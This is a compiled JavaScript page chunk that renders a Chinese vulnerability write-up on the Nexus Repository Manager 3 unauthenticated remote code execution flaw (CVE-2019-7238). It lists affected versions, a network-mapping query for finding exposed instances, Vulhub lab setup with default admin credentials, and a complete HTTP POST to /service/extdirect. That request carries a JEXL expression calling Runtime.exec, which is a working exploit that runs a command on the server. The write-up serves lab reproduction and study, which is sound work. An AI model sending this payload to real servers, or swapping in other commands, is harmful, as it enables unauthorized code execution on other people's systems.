import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{r as i,o as r,c as s,a as e,b as t,d as a,e as u}from"./app-58e4a7d6.js";const c={},d=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),t(" 漏洞描述")],-1),l=e("p",null,"Nexus Repository Manager 3 是一款软件仓库，可以用来存储和分发Maven、NuGET等软件源仓库。其3.14.0及之前版本中，存在一处基于OrientDB自定义函数的任意JEXL表达式执行功能，而这处功能存在未授权访问漏洞，将可以导致任意命令执行漏洞。",-1),p=e("p",null,"参考链接：",-1),h={href:"https://support.sonatype.com/hc/en-us/articles/360017310793-CVE-2019-7238-Nexus-Repository-Manager-3-Missing-Access-Controls-and-Remote-Code-Execution-February-5th-2019",target:"_blank",rel:"noopener noreferrer"},m={href:"https://xz.aliyun.com/t/4136",target:"_blank",rel:"noopener noreferrer"},q={href:"https://www.anquanke.com/post/id/171116",target:"_blank",rel:"noopener noreferrer"},g={href:"http://commons.apache.org/proper/commons-jexl/",target:"_blank",rel:"noopener noreferrer"},v=u(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Nexus &lt; 3.14.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;Nexus-Repository-Manager&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动Nexus Repository Manager 3.14.0：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>等待一段时间环境才能成功启动，访问<code>http://your-ip:8081</code>即可看到Web页面。</p><p>使用账号密码<code>admin:admin123</code>登录后台，然后在maven-releases下随便上传一个jar包：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202262346892.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>触发该漏洞，必须保证仓库里至少有一个包存在。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>接口没有校验权限，所以直接发送如下数据包，即可执行<code>touch /tmp/success</code>命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /service/extdirect HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 368
Connection: close

{&quot;action&quot;:&quot;coreui_Component&quot;,&quot;method&quot;:&quot;previewAssets&quot;,&quot;data&quot;:[{&quot;page&quot;:1,&quot;start&quot;:0,&quot;limit&quot;:50,&quot;sort&quot;:[{&quot;property&quot;:&quot;name&quot;,&quot;direction&quot;:&quot;ASC&quot;}],&quot;filter&quot;:
[{&quot;property&quot;:&quot;repositoryName&quot;,&quot;value&quot;:&quot;*&quot;},{&quot;property&quot;:&quot;expression&quot;,&quot;value&quot;:&quot;233.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;touch /tmp/success&#39;)&quot;},{&quot;property&quot;:&quot;type&quot;,&quot;value&quot;:&quot;jexl&quot;}]}],&quot;type&quot;:&quot;rpc&quot;,&quot;tid&quot;:8}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202262348240.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可见，<code>/tmp/success</code>已成功执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202262348849.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>原理是expression位置的JEXL表达式被执行，详情可阅读参考文档。</p>`,18);function x(_,b){const o=i("ExternalLinkIcon");return r(),s("div",null,[d,l,p,e("ul",null,[e("li",null,[e("a",h,[t("https://support.sonatype.com/hc/en-us/articles/360017310793-CVE-2019-7238-Nexus-Repository-Manager-3-Missing-Access-Controls-and-Remote-Code-Execution-February-5th-2019"),a(o)])]),e("li",null,[e("a",m,[t("https://xz.aliyun.com/t/4136"),a(o)])]),e("li",null,[e("a",q,[t("https://www.anquanke.com/post/id/171116"),a(o)])]),e("li",null,[e("a",g,[t("http://commons.apache.org/proper/commons-jexl/"),a(o)])])]),v])}const k=n(c,[["render",x],["__file","Nexus Repository Manager 3 extdirect 远程命令执行漏洞 CVE-2019-7238.html.vue"]]);export{k as default};
